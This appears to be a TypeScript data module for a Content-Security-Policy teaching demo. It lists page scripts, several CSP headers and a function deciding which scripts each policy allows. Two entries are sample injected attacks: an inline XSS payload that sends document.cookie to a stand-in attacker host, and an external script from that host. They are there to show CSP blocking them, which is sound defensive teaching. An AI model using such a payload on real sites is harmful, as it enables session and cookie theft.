// Scripts on a page, and which ones a Content-Security-Policy lets run.
export const SCRIPTS = [
  { id: "app", label: "<script src=\"/app.js\">", origin: "self", inline: false, nonce: true, evil: false },
  { id: "analytics", label: "<script src=\"https://plausible.io/js/script.js\">", origin: "plausible.io", inline: false, nonce: true, evil: false },
  { id: "boot", label: "<script nonce=…>window.CONFIG = {…}</script>", origin: "inline", inline: true, nonce: true, evil: false },
  { id: "xss", label: "<script>fetch('//evil.io?c='+document.cookie)</script>", origin: "inline (injected)", inline: true, nonce: false, evil: true },
  { id: "evilsrc", label: "<script src=\"https://evil.io/x.js\"> (injected)", origin: "evil.io", inline: false, nonce: false, evil: true },
];
export type Policy = "none" | "self" | "self+analytics" | "nonce";
export const POLICIES: { id: Policy; label: string; header: string }[] = [
  { id: "none", label: "No CSP", header: "(none)" },
  { id: "self", label: "script-src 'self'", header: "Content-Security-Policy: script-src 'self'" },
  { id: "self+analytics", label: "+ analytics domain", header: "Content-Security-Policy: script-src 'self' https://plausible.io" },
  { id: "nonce", label: "Nonce-based (strict)", header: "Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'" },
];
export function runs(p: Policy, s: (typeof SCRIPTS)[number]) {
  if (p === "none") return true;
  if (p === "nonce") return s.nonce;
  if (s.inline) return false;
  if (s.origin === "self") return true;
  return p === "self+analytics" && s.origin === "plausible.io";
}
